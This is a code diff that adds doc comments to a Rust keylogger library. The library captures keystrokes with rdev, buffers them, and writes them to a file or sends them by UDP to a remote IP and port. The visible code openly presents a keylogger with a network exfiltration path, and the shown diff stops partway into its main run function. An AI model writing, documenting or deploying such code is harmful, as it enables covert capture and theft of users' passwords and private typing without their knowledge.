@@ -1,15 +1,25 @@
+//! A cross-platform keylogger library that provides both file and network-based logging capabilities
+//!
+//! This module implements a keylogger that can capture keyboard events and log them either to a local file
+//! or send them over a network connection using UDP. It supports configurable keystroke buffering.
 use rdev::{listen, Event, EventType};
 use std::io::Write;
 use std::net::IpAddr;
 use std::sync::{Arc, Mutex};
 
+/// A trait for logging implementations that can be safely shared between threads
 pub trait Log: Send + Sync {
+    /// Logs the provided string data
     fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>>;
 }
 
+/// A network logger that sends log messages over UDP
 pub struct NetworkLogger {
+    /// The IPv4 address of the logging server
     pub ipv4_addr: IpAddr,
+    /// The port number of the logging server
     pub port: u16,
+    /// The UDP socket used for sending log messages
     socket: std::net::UdpSocket,
 }
 
@@ -24,6 +34,7 @@ impl NetworkLogger {
 }
 
 impl Log for NetworkLogger {
+    /// Sends a log message over UDP to the configured logging server
     fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
         self.socket
             .send_to(data.as_bytes(), (self.ipv4_addr, self.port))?;
@@ -31,7 +42,9 @@ impl Log for NetworkLogger {
     }
 }
 
+/// A file-based logger that writes log messages to a specified file
 pub struct FileLogger {
+    /// The path to the file where logs will be written
     pub recorder_file: std::path::PathBuf,
 }
 
@@ -42,6 +55,7 @@ impl FileLogger {
 }
 
 impl Log for FileLogger {
+    /// Writes a log message to the configured file
     fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
         let mut file = std::fs::OpenOptions::new()
             .create(true)
@@ -52,6 +66,21 @@ impl Log for FileLogger {
     }
 }
 
+/// Starts the keylogger with the specified logger and keystroke threshold
+///
+/// # Arguments
+/// * `logger` - A thread-safe logging implementation that implements the `Log` trait
+/// * `keystroke_threshold` - The number of keystrokes to buffer before triggering a log write
+///
+/// # Details
+/// This function creates a keyboard event listener that:
+/// 1. Captures keystrokes and stores them in a thread-safe buffer
+/// 2. When the buffer reaches the specified threshold, writes the collected keystrokes to the logger
+/// 3. Clears the buffer after successful logging
+///
+/// The function will exit with status code 1 if either:
+/// - There's an error writing to the logger
+/// - The keyboard event listener fails to initialize
 pub fn run(logger: Box<dyn Log>, keystroke_threshold: u32) {
     // Create a shared, thread-safe logger and key buffer instance
     let logger = Arc::new(Mutex::new(logger));
